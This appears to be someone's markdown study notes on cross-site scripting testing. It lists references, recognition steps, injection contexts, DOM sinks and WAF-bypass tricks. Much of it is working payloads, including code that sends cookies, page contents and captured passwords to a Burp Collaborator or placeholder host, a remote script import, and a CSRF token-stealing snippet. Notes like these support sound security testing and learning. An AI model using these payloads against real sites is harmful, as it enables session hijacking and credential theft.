# References
- Michael Sommer videos
- [Nahamsec Video](https://www.youtube.com/watch?v=ej2O4lOUzRc)
- [z3nsh3ll Playlist](https://www.youtube.com/playlist?list=PLWvfB8dRFqbZG5cw2OrnEmzSzorxRuxFV)
- https://public-firing-range.appspot.com/
- [Portswigger XSS Cheatsheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)

# Tools and Burp Extensions
- Web Developer Tools
- DOM Invader - Burp Suite Browser Extension

# What is it?
- When an attacker is able to inject javascript into a website
- Three types:
    - Reflected
    - Stored
    - DOM

# Recognition
- Remember that HTML parsing occurs before Javascript parsing
- Figure out where the input ends up. Is it a tag attribute, a script tag, etc?
- Are certain tags or attributes blocked? Use intruder and an XSS cheatsheet to find unblocked tags/attributes
- Is there any special handling for data? Do urls get turned into links?
- How are special characters handled? insert '<>:;"\/ to find out if they are being encoded.
```html
'"<a><<adsa>>\';//
```
- Introduce an event handler
```html
<u/onmouseover=alert(1)>test123
<img src=x onerror=alert(1)>
<!-- Other functions besides alert() can be used -->
Confirm
import('https://mysite.com/1.js')
print()
<!-- Example Below -->
<img src=x onerror=import('https://mysite.com/1.js')>
<!-- -->
```
- Every parameter in a url is a possible input field for XSS payloads
- Input a payload in the field and use `Control+F` to see if it reflects
- After that, use `Inspect` to check the DOM, also check the source code with the`view-source` functionality, or the HTTP response
- Determine the context where the input is seen 
- Figure out how to execute javascript within the context
- Determine what is getting encoded: ' " / \ < > ?
```html
test123;//
'"<a><<adsa>>\';//
</script>test123<img src=x onerror=alert(1)>
'; alert(1)//test123
%23f5f5f5</style>test123<script>alert(1)</script>
javascript:alert(document.cookie)
<iframe src="vulnerable-website#" onload="this.src+='<img src=1 onerror=print()>'" width="800" height="800"></iframe>
<iframe src="vulnerable-website" onload=this.style.width='100px'>
<img src=1 oNeRrOr=alert`1`>
'-alert-'
\'-alert(1)//
'"><svg/onload=fetch(`//url/${encodeURIComponent(document.cookie)}`)>
```
- Check for other parameters in the source code to find more possible injection vectors
- Test all the fields that are presented within the webpage
- Check the element and see if it is being encoded `&quot;` as an HTML entity
- Try to `Edit as HTML` and see if the special characters got html encoded
- There might be controls put in place via the browser but not the API
- Some payloads might not be allowed via the UI but sending them via the HTTP request on burp suite bypasses these controls

# Some Exploit payloads
- Payload 1
```js
var xhr = new XMLHttpRequest();
xhr.onload=function(){
    const x = new XMLHttpRequest();
    x.open('GET', 'url=?'+btoa(this.responseText));
    x.send();
};
xhr.open('GET', 'URL');
xhr.send();
```
- Payload 2
```js
var xhr = new XMLHttpRequest();
xhr.open('GET', 'https://burp-collaborator/?'+btoa(document.cookie));
xhr.send();
```
- Payload 3
```html
<script>
fetch('https://BURP-COLLABORATOR-SUBDOMAIN', {
method: 'POST',
mode: 'no-cors',
body:document.cookie
});
</script>
```
- Payload 4
```html
<!--watch video "CSRF XSS payload example"-->
<script>
window.addEventListener('DOMContentLoaded', function(){
var token = document.getElementsByName('csrf')[0].value;
var data = new FormData();

data.append('csrf', token);
data.append('postId', 5);
data.append('comment', document.cookie);
data.append('name', 'victim');
data.append('email', 'someemail@email.net');
data.append('website','https://website.net');

fetch('/post/comment', {
    method: 'POST',
    mode: 'no-cors',
    body: data
});
});
</script>
```
- Payload 5
```html
<input name=username id=username>
<input type=password name=password onchange="if(this.value.length)fetch('https://BURP-COLLABORATOR-SUBDOMAIN',{
method:'POST',
mode: 'no-cors',
body: username.value+':'+this.value
});">
```
- Payload 6
```html
<script>
location = 'url-here';
</script>
```
- [CSRF XSS payload example](https://www.youtube.com/watch?v=N_87S9XVy0w)
- [Password Autofill-Payload example](https://www.youtube.com/watch?v=I6TOtXSOZ90)

# XSS Context
- Remember that HTML parsing occurs before Javascript parsing
- XSS in HTML tag attribute: Find a way to terminate the attribute and add a new one with an event handler that allows you to inject the payload
- href attribute - javascript:alert()
- XSS in Javascript template literals ``
```js
// Use the ${...} to insert the payload
${insert-payload-here}
```
- Try double curly brackets and see if it is evaluated `{{ 1 + 1 }}`
- Inside eval
- Are the angle brackets <> getting encoded/escaped? Is the encoding recursive or just the first instance? Try `<><img src=x onerror=alert()>`
- Hidden field or canonical link: Use accessKey event `accessKey="X" onclick="alert(1)"`[Portswigger Article](https://portswigger.net/research/xss-in-hidden-input-fields)
- Inside a quoted tag attribute Use HTML-encoding: After the HTML tags and attributes are parsed, the browser will perform HTML-decoding of the tag attribute values `&apos;-alert()-&apos;`

# Sinks
- innerHTML
    - On modern web browsers `script` elements inserted with innerHTML are sanitized
    - On modern web browsers `onload` events inside `svg` elements inserted with innerHTML are sanitized 
    - use `<img>` or `<iframe>` as viable options to inject a payload
    - [W3 HTML5 - innerHTML](https://www.w3.org/TR/2008/WD-html5-20080610/dom.html#innerhtml0)
    - [Developer Mozilla - innerHTML](https://developer.mozilla.org/en-US/docs/Web/API/Element/innerHTML)
- Sources and sinks in third-party dependencies
    - Each one has it quirks, investigate about them.
    - jQuery
        - attr(): this function changes the attributes of DOM elements. If the sink is an `href` attribute, then inject a malicious `javascript:payload-here`
        - $(): this function selector joined with the insecure usage of the `contains` method could be vulnerable due to malicious DOM element injection. Example involving `location.hash`, payload: `<iframe src="https://vulnerable-website.com#" onload="this.src+='<img src=1 onerror=alert(1)>'">`
    - AngularJS
        - ng-app: If this attribute is used on a HTML element AngularJS will execute javascript inside double curly braces `{{$on.constructor('alert(1)')()}}`
# Obfuscation
- Some payloads may need to be obfuscated to bypass WAF
```html
<img src=1 oNeRrOr=alert`1`>
```
